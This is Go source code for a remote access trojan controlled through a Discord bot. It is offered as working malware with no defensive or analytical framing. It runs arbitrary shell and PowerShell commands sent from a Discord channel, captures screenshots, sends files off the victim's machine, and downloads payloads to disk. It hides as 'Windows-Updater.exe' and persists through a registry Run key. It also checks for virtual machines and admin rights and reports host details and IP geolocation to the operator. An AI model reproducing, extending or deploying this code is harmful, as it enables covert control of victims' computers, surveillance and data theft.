package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/cpu"
	"golang.org/x/sys/windows"
)

// Global variable for channel ID
var myChannelId string

type LocationResponse struct {
	IP       string `json:"YourFuckingIPAddress"`
	Country  string `json:"YourFuckingCountry"`
	City     string `json:"YourFuckingCity"`
	Location string `json:"YourFuckingLocation"`
}

func getBits() string {
	if runtime.GOARCH == "amd64" {
		return "64-bit"
	}
	return "32-bit"
}

func getCPU() string {
	cpuInfo, err := cpu.Info()
	if err != nil {
		return "None" // Return "None" if an error occurs
	}

	// Assuming we want to return the first CPU's model name
	if len(cpuInfo) > 0 {
		return cpuInfo[0].ModelName // Return the model name of the first CPU
	}
	return "None"
}

func isAdmin() string {
	if runtime.GOOS == "windows" {
		// Windows specific check for admin rights
		var sid *windows.SID
		if err := windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-5-32-544"), &sid); err != nil {
			return "No" // Unable to get SID, assume not admin
		}

		isAdmin := false
		var token windows.Token
		if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
			defer token.Close()

			// Check if the user has admin privileges
			if isAdmin, err = token.IsMember(sid); err != nil {
				return "No" // Error checking membership
			}
		}

		if isAdmin {
			return "Yes" // User is an admin
		}
		return "No" // User is not an admin
	} else {
		// Linux and macOS specific check for admin rights
		if os.Geteuid() == 0 {
			return "Yes" // User is root
		}
		return "No" // User is not root
	}
}

func isVM() string {
	rules := []string{"Virtualbox", "vmbox", "vmware"}
	cmd := exec.Command("cmd", "/C", "SYSTEMINFO") // Using cmd on Windows

	out, err := cmd.Output()
	if err != nil {
		return "No" // Error executing command, assume not a VM
	}

	// Convert output to string
	output := string(out)

	for _, rule := range rules {
		// Using regular expression to check for virtualization keywords
		match, _ := regexp.MatchString("(?i)"+regexp.QuoteMeta(rule), output)
		if match {
			return "Yes" // Found a match, it is a VM
		}
	}
	return "No" // No matches found, it is not a VM
}

// helpCommand sends a list of available commands and their descriptions
func helpCommand(s *discordgo.Session, channelID string) {
	commands := []struct {
		Command     string
		Description string
	}{
		{"🏃‍♂️ <command>", "Runs a system command."},
		{"📸", "Takes a screenshot of all displays."},
		{"👇 <file>", "Uploads a specified file from your system."},
		{"☝️ <path>", "Downloads the attached file to the specified path."},
		{"💀", "Shuts down the bot."},
		{"!help", "Displays this help menu."},
	}

	var helpMessage strings.Builder
	helpMessage.WriteString("```bash\n")
	helpMessage.WriteString("Available Commands:\n\n")
	for _, cmd := range commands {
		helpMessage.WriteString(fmt.Sprintf("%s - %s\n", cmd.Command, cmd.Description))
	}
	helpMessage.WriteString("```")

	s.ChannelMessageSend(channelID, helpMessage.String())
}

// getTmpDir returns the OS-specific temp directory
func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	}
	return "/tmp/"
}

func handleUploadCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Extract the URL and path options
	url := i.ApplicationCommandData().Options[0].StringValue()
	path := i.ApplicationCommandData().Options[1].StringValue()

	// Upload the file from the URL
	if err := uploadFileFromURL(s, i, url, path); err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error uploading file from URL: " + err.Error(),
			},
		})
		return
	}
}

func uploadFileFromURL(s *discordgo.Session, i *discordgo.InteractionCreate, url, path string) error {
	// Create the file at the specified path
	out, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("error creating file: %w", err)
	}
	defer out.Close()

	// Download the file from the provided URL
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("error downloading file: %w", err)
	}
	defer resp.Body.Close()

	// Check if the response status is OK
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("error: received status code %d", resp.StatusCode)
	}

	// Write the response body to the file
	if _, err := io.Copy(out, resp.Body); err != nil {
		return fmt.Errorf("error writing to file: %w", err)
	}

	// Send a confirmation message back to Discord
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Uploaded file from URL to " + path,
		},
	})
	return nil
}

// sendLongMessage handles messages that are too long to send in a single Discord message
func sendLongMessage(s *discordgo.Session, channelID string, out []byte, ref *discordgo.MessageReference) {
	if len(out) > 2000-13 { // Check if the message is too long
		tempFile, err := os.CreateTemp(getTmpDir(), "*.txt")
		if err != nil {
			fmt.Println("Error creating temp file:", err)
			return
		}
		defer tempFile.Close()

		tempFile.Write(out)
		fileName := tempFile.Name()

		f, err := os.Open(fileName)
		if err != nil {
			fmt.Println("Error opening temp file:", err)
			return
		}
		defer f.Close()

		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Files:     []*discordgo.File{fileStruct},
			Reference: ref,
		})
	} else {
		resp := fmt.Sprintf("```bash\n%s\n```", string(out))
		s.ChannelMessageSendReply(channelID, resp, ref)
	}
}

// runCommand runs a system command based on the OS
func runCommand(s *discordgo.Session, m *discordgo.MessageCreate, command string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", command)
	} else {
		cmd = exec.Command("/bin/bash", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		out = append(out, []byte("\n"+err.Error())...)
	}
	sendLongMessage(s, m.ChannelID, out, m.Reference())
}

// Function to list all running processes on the system
func listProcesses() (string, error) {
	var cmd *exec.Cmd

	// Check the OS type and set the appropriate command to list processes
	if runtime.GOOS == "windows" {
		// Use tasklist for Windows
		cmd = exec.Command("tasklist")
	} else {
		// Use ps on Unix-based systems (Linux, macOS, etc.)
		cmd = exec.Command("ps", "aux")
	}

	// Run the command and capture the output
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	// Return the output wrapped in a bash-styled code block
	return fmt.Sprintf("```bash\n%s\n```", string(output)), nil
}

// Function to list directory contents with bash styling
func listDirectory(path string) (string, error) {
	files, err := os.ReadDir(path)
	if err != nil {
		return "", err
	}

	var contents []string
	for _, file := range files {
		// Append file or directory name to the contents list
		contents = append(contents, file.Name())
	}

	// Join the contents into a single string separated by newlines
	dirList := strings.Join(contents, "\n")

	// Return the directory contents wrapped in ```bash for Discord styling
	return fmt.Sprintf("```bash\n%s\n```", dirList), nil
}

// Change the wallpaper of the target machine
func changeWallpaper(imageURL string) error {
	// Download the image
	response, err := http.Get(imageURL)
	if err != nil {
		return fmt.Errorf("error downloading image: %v", err)
	}
	defer response.Body.Close()

	// Check if the response is successful
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to download image: status code %d", response.StatusCode)
	}

	// Create a temporary file to save the downloaded image
	tempFile, err := os.CreateTemp("", "wallpaper.*.jpg")
	if err != nil {
		return fmt.Errorf("error creating temp file: %v", err)
	}
	defer os.Remove(tempFile.Name()) // Clean up temp file

	// Write the image data to the temp file
	_, err = io.Copy(tempFile, response.Body)
	if err != nil {
		return fmt.Errorf("error saving image to temp file: %v", err)
	}

	// Set the wallpaper (platform-specific)
	if runtime.GOOS == "windows" {
		err = setWallpaperWindows(tempFile.Name())
	} else {
		err = setWallpaperUnix(tempFile.Name())
	}

	return err
}

// Set wallpaper for Windows
func setWallpaperWindows(imagePath string) error {
	// Use Windows API to change wallpaper
	// This code may require additional libraries or permissions
	cmd := exec.Command("cmd", "/C", "reg", "add", "HKEY_CURRENT_USER\\Control Panel\\Desktop", "/v", "WallPaper", "/t", "REG_SZ", "/d", imagePath, "/f")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("error setting wallpaper: %v", err)
	}

	// Notify Windows to update the wallpaper
	cmd = exec.Command("RUNDLL32.EXE", "user32.dll,UpdatePerUserSystemParameters")
	return cmd.Run()
}

// Set wallpaper for Unix-based systems
func setWallpaperUnix(imagePath string) error {
	// For Linux, use feh or another wallpaper manager
	cmd := exec.Command("feh", "--bg-scale", imagePath)
	return cmd.Run()
}

func makePersistent() (string, error) {
	// Define the backdoor location (in AppData folder)
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return "", errors.New("APPDATA environment variable not found")
	}
	backdoorLocation := appData + "\\Windows-Updater.exe"

	// Check if the backdoor file already exists
	if _, err := os.Stat(backdoorLocation); !os.IsNotExist(err) {
		return "Persistence already enabled.", nil
	}

	// Copy the current executable to the backdoor location
	currentExecutable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("error getting current executable path: %v", err)
	}
	err = copyFile(currentExecutable, backdoorLocation)
	if err != nil {
		return "", fmt.Errorf("error copying file to AppData: %v", err)
	}

	// Add the backdoor to the Windows startup via registry
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "update", "/t", "REG_SZ", "/d", backdoorLocation, "/f")
	err = cmd.Run()
	if err != nil {
		return "", fmt.Errorf("error adding to registry: %v", err)
	}

	return "Persistence enabled successfully.", nil
}

// Helper function to copy files
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return err
}

// handleScreenshot takes and sends a screenshot of all displays
func handleScreenshot(s *discordgo.Session, m *discordgo.MessageCreate) {
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("Error capturing screenshot:", err)
			continue
		}

		fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)
		if err != nil {
			fmt.Println("Error creating screenshot file:", err)
			continue
		}
		defer file.Close()

		png.Encode(file, img)
		f, err := os.Open(fileName)
		if err != nil {
			fmt.Println("Error opening screenshot file:", err)
			continue
		}
		defer f.Close()

		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Files:     []*discordgo.File{fileStruct},
			Reference: m.Reference(),
		})
	}
}

// handleFileDownload uploads a file from the system to Discord if it's under 8MB
func handleFileDownload(s *discordgo.Session, m *discordgo.MessageCreate) {
	fileName := m.Content[5:]
	f, err := os.Open(fileName)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "Error opening file: "+err.Error(), m.Reference())
		return
	}
	defer f.Close()

	fi, _ := f.Stat()
	if fi.Size() < 8388608 {
		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Files:     []*discordgo.File{fileStruct},
			Reference: m.Reference(),
		})
	} else {
		s.ChannelMessageSendReply(m.ChannelID, "File is larger than 8MB 😔", m.Reference())
	}
}

// handleFileUpload downloads the attached file from Discord to the system
func handleFileUpload(s *discordgo.Session, m *discordgo.MessageCreate) {
	path := m.Content[7:]
	if len(m.Attachments) > 0 {
		out, err := os.Create(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error creating file: "+err.Error(), m.Reference())
			return
		}
		defer out.Close()

		resp, err := http.Get(m.Attachments[0].URL)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error downloading file: "+err.Error(), m.Reference())
			return
		}
		defer resp.Body.Close()

		io.Copy(out, resp.Body)
		s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
	}
}

// Function to fetch location data
func getLocation() (*LocationResponse, error) {
	response, err := http.Get("https://json.ipv4.myip.wtf")
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("failed to fetch location data, status: %s", response.Status)
	}

	var locationData LocationResponse
	if err := json.NewDecoder(response.Body).Decode(&locationData); err != nil {
		return nil, err
	}

	return &locationData, nil
}

// Function to change the directory
func changeDirectory(path string) error {
	err := os.Chdir(path)
	if err != nil {
		return err
	}
	return nil
}

// handler manages the incoming Discord commands
func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages in other channels and own messages
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...

	switch {
	case strings.HasPrefix(m.Content, "🏃‍♂️"):
		go runCommand(s, m, m.Content[14:])
	case m.Content == "📸":
		go handleScreenshot(s, m)
	case strings.HasPrefix(m.Content, "👇"):
		go handleFileDownload(s, m)
	case strings.HasPrefix(m.Content, "☝️"):
		go handleFileUpload(s, m)
	case m.Content == "💀":
		s.Close()
		os.Exit(0)
	case strings.HasPrefix(m.Content, "!help"):
		go helpCommand(s, m.ChannelID)
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
}

// slashCommandHandler handles the new slash commands
func slashCommandHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.ApplicationCommandData().Name {
	case "cmd":
		command := i.ApplicationCommandData().Options[0].StringValue()
		var out []byte
		var err error
		if runtime.GOOS == "windows" {
			cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", command)
			out, err = cmd.CombinedOutput()
		} else {
			cmd := exec.Command("/bin/bash", "-c", command)
			out, err = cmd.CombinedOutput()
		}
		if err != nil {
			out = append(out, []byte("\n"+err.Error())...)
		}
		if len(out) > 2000-13 {
			tempFile, err := os.CreateTemp("", "*.txt")
			if err != nil {
				fmt.Println("Error creating temp file:", err)
				return
			}
			defer os.Remove(tempFile.Name()) // Clean up the temp file afterwards

			// Write output to the temporary file
			if _, err := tempFile.Write(out); err != nil {
				fmt.Println("Error writing to temp file:", err)
				return
			}
			tempFile.Close() // Close the file to flush the buffer

			// Open the temporary file for reading
			f, err := os.Open(tempFile.Name())
			if err != nil {
				fmt.Println("Error opening temp file:", err)
				return
			}
			defer f.Close()

			// Prepare the file for Discord message
			fileStruct := &discordgo.File{Name: tempFile.Name(), Reader: f}

			// Send the message with the file attachment
			s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
				Files: []*discordgo.File{fileStruct},
			})
		} else {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Command output:\n```bash\n%s\n```", string(out)),
				},
			})
		}
	case "help":
		helpMessage := "```bash\nAvailable Commands:\n\n" +
			"🏃‍♂️ /cmd <command>      # Runs a system command\n" +
			"📸 /screenshot          # Takes a screenshot of all displays\n" +
			"👇 /upload <file>       # Uploads a specified file from your system\n" +
			"☝️ /download <path>     # Downloads the attached file to the specified path\n" +
			"💀 /shutdown            # Shuts down the bot\n" +
			"!help                  # Displays this help menu\n" +
			"```"

		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: helpMessage,
			},
		})
	case "screenshot":
		n := screenshot.NumActiveDisplays()
		for idx := 0; idx < n; idx++ {
			bounds := screenshot.GetDisplayBounds(idx)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				fmt.Println("Error capturing screenshot:", err)
				continue
			}

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), idx, bounds.Dx(), bounds.Dy())
			file, err := os.Create(fileName)
			if err != nil {
				fmt.Println("Error creating screenshot file:", err)
				continue
			}

			// Encode the image to the file
			if err := png.Encode(file, img); err != nil {
				fmt.Println("Error encoding image to file:", err)
				file.Close() // Ensure the file is closed in case of an error
				continue
			}
			file.Close() // Close the file after encoding

			f, err := os.Open(fileName)
			if err != nil {
				fmt.Println("Error opening screenshot file:", err)
				continue
			}
			defer f.Close()

			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			_, err = s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
				Files: []*discordgo.File{fileStruct},
			})
			if err != nil {
				fmt.Println("Error sending screenshot:", err)
			}
		}

		// Respond to the interaction after sending the screenshots
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Screenshots sent!",
			},
		})
	case "download":
		// Extract the file path from the command input
		filePath := i.ApplicationCommandData().Options[0].StringValue()

		// Open the file
		f, err := os.Open(filePath)
		if err != nil {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error opening file: " + err.Error(),
				},
			})
			return
		}
		defer f.Close()

		// Get file info to check size
		fi, _ := f.Stat()
		if fi.Size() < 8388608 { // Less than 8MB
			fileStruct := &discordgo.File{
				Name:   fi.Name(),
				Reader: f,
			}
			// Send the file to the user
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Uploading file...",
					Files: []*discordgo.File{
						fileStruct,
					},
				},
			})
		} else {
			// File is too large
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "File is larger than 8MB 😔",
				},
			})
		}
	case "location":
		locationData, err := getLocation()
		if err != nil {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error fetching location data.",
				},
			})
			return
		}

		responseMessage := fmt.Sprintf("Your IP: %s\nCountry: %s\nCity: %s", locationData.IP, locationData.Country, locationData.City)

		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: responseMessage,
			},
		})
	case "cd":
		// Retrieve the path argument from the command
		if len(i.ApplicationCommandData().Options) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error: No path provided.",
				},
			})
			return
		}

		path := i.ApplicationCommandData().Options[0].StringValue()

		// Try to change the directory
		err := changeDirectory(path)
		if err != nil {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Error changing directory: %v", err),
				},
			})
		} else {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Successfully changed directory to: %s", path),
				},
			})
		}
	case "upload":
		handleUploadCommand(s, i)
	case "persistent":
		response, err := makePersistent()
		if err != nil {
			response = fmt.Sprintf("Error enabling persistence: %v", err)
		}

		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: response,
			},
		})
	case "ls":
		// Retrieve the directory path from the command
		var path string
		if len(i.ApplicationCommandData().Options) > 0 {
			path = i.ApplicationCommandData().Options[0].StringValue()
		} else {
			path = "." // Default to current directory
		}

		// List the directory contents
		dirContents, err := listDirectory(path)
		if err != nil {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Error listing directory: %v", err),
				},
			})
		} else {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Contents of `%s`:\n%s", path, dirContents),
				},
			})
		}
	case "process":
		// List running processes and handle long output
		processList, err := listProcesses()
		if err != nil {
			processList = fmt.Sprintf("Error listing processes: %v", err)
		}

		// Convert the process list to a byte array for the sendLongMessage function
		out := []byte(processList)

		// Check if the Interaction has an associated message before trying to use its reference
		var messageRef *discordgo.MessageReference
		if i.Interaction.Message != nil {
			messageRef = i.Interaction.Message.Reference()
		}

		// Send the process list to Discord, using sendLongMessage to handle long outputs
		sendLongMessage(s, i.ChannelID, out, messageRef)
	case "wallpaper":
		// Get the image URL from the command options
		url := i.ApplicationCommandData().Options[0].StringValue()

		// Change the wallpaper using the provided URL
		err := changeWallpaper(url)
		if err != nil {
			// Respond with an error message
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Error changing wallpaper: %v", err),
				},
			})
			return
		}

		// Respond with a success message
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Wallpaper changed successfully!",
			},
		})
	case "shutdown":
		// Respond to the interaction before shutting down
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Shutting down the bot... Goodbye! 👋",
			},
		})

		// Perform any necessary cleanup here before closing
		// ...

		// Close the Discord session and exit
		s.Close()
		os.Exit(0)
	}
}

// registerSlashCommands registers the new /cmd slash command
func registerSlashCommands(s *discordgo.Session) {
	_, err := s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "cmd",
		Description: "Run a system command",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "command",
				Description: "The system command to run",
				Required:    true,
			},
		},
	})
	if err != nil {
		fmt.Println("Error creating slash command:", err)
	}
	// Register the /help slash command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "help",
		Description: "Displays the help menu",
	})
	if err != nil {
		fmt.Println("Error creating /help slash command:", err)
	}
	// Register the /download command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "download",
		Description: "Download a file from the server",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "file",
				Description: "The file path to download",
				Required:    true,
			},
		},
	})
	if err != nil {
		fmt.Println("Error creating /download command:", err)
	}
	// Register the /screenshot command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "screenshot",
		Description: "Take a screenshot of all displays and send it to the channel",
	})
	if err != nil {
		fmt.Println("Error creating slash command:", err)
	}
	// Register the /shutdown command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "shutdown",
		Description: "Shuts down the bot.",
	})
	if err != nil {
		fmt.Println("Cannot create command:", err)
	}
	// Register the /location command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "location",
		Description: "Get your current IP location.",
	})
	if err != nil {
		fmt.Println("Cannot create command:", err)
	}
	// Register the /cd command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "cd",
		Description: "Change the working directory.",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Name:        "path",
				Description: "The path to change to.",
				Type:        discordgo.ApplicationCommandOptionString,
				Required:    true,
			},
		},
	})
	if err != nil {
		fmt.Println("Cannot create command:", err)
	}
	// Register the /ls command
	// Inside your bot's initialization function
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "ls",
		Description: "List the contents of a directory.",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Name:        "path",
				Description: "The directory path to list contents from.",
				Type:        discordgo.ApplicationCommandOptionString,
				Required:    false, // Path is optional; defaults to current directory
			},
		},
	})
	if err != nil {
		fmt.Println("Cannot create command:", err)
	}
	// Register the /process command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "process",
		Description: "List all the processes running on the target machine",
	})
	if err != nil {
		fmt.Println("Cannot create '/process' command:", err)
	}
	// Register the /persistent command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "persistent",
		Description: "Make the agent persistent on the target machine.",
	})
	if err != nil {
		fmt.Println("Cannot create /persistent command:", err)
	}
	// Register the /upload command
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "upload",
		Description: "Upload a file from a URL to a specified path.",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "url",
				Description: "URL of the file to upload.",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "path",
				Description: "Path to save the uploaded file.",
				Required:    true, // Keep it as true
			},
		},
	})

	if err != nil {
		fmt.Println("Error registering command: ", err)
	}
	// Register the command with a URL option
	_, err = s.ApplicationCommandCreate(s.State.User.ID, myChannelId, &discordgo.ApplicationCommand{
		Name:        "wallpaper",
		Description: "Change the wallpaper of the target machine.",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "url",
				Description: "The URL of the image to set as wallpaper.",
				Required:    true,
			},
		},
	})
	if err != nil {
		fmt.Println("Error registering command:", err)
	}
}

func main() {
	// Get token and channel ID from environment variables
	token := "BOT_TOKEN"
	myChannelId = "CHANNEL_ID"

	// Create a new Discord session
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}

	// Register the message handler
	dg.AddHandler(handler)
	// dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Register the slash command handler
	dg.AddHandler(slashCommandHandler)

	// Open a websocket connection to Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	// Register slash commands
	go registerSlashCommands(dg)

	rand.Seed(time.Now().UnixNano())
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting current user:", err)
		return
	}
	sessionId := fmt.Sprintf("%s_%s", runtime.GOOS, hostname)
	c, err := dg.GuildChannelCreate("CHANNEL_ID", sessionId, 0) // Replace with your guild ID
	if err != nil {
		fmt.Println("Error creating channel:", err)
		return
	}
	myChannelId = c.ID

	// Send first message with basic info
	// hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	now := time.Now().Format("02/01/2006 15:04:05")

	// Create the embed message
	embed := &discordgo.MessageEmbed{
		Title:       fmt.Sprintf("Session *%s* opened! 🥳", sessionId),
		Description: fmt.Sprintf("**CWD**: %s", cwd),
		Color:       0x00FF00, // You can choose the color you want
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   "**Time**",
				Value:  now,
				Inline: true,
			},
			{
				Name:   "**IP**",
				Value:  localAddr.IP.String(),
				Inline: true,
			},
			{
				Name:   "**Bits**",
				Value:  getBits(),
				Inline: true,
			},
			{
				Name:   "**Hostname**",
				Value:  hostname,
				Inline: true,
			},
			{
				Name:   "**OS**",
				Value:  runtime.GOOS,
				Inline: true,
			},
			{
				Name:   "**Username**",
				Value:  currentUser.Username,
				Inline: true,
			},
			{
				Name:   "**CPU**",
				Value:  getCPU(),
				Inline: true,
			},
			{
				Name:   "**Is Admin**",
				Value:  isAdmin(),
				Inline: true,
			},
			{
				Name:   "**Is VM**",
				Value:  isVM(),
				Inline: true,
			},
		},
	}
	// Send the embed message
	m, err := dg.ChannelMessageSendEmbed(myChannelId, embed)
	if err != nil {
		fmt.Println("Error sending embed message:", err)
		return
	}
	// Pin the message
	dg.ChannelMessagePin(myChannelId, m.ID)

	// Wait for interrupt signal to gracefully close
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	// Close the Discord session
	dg.Close()
}
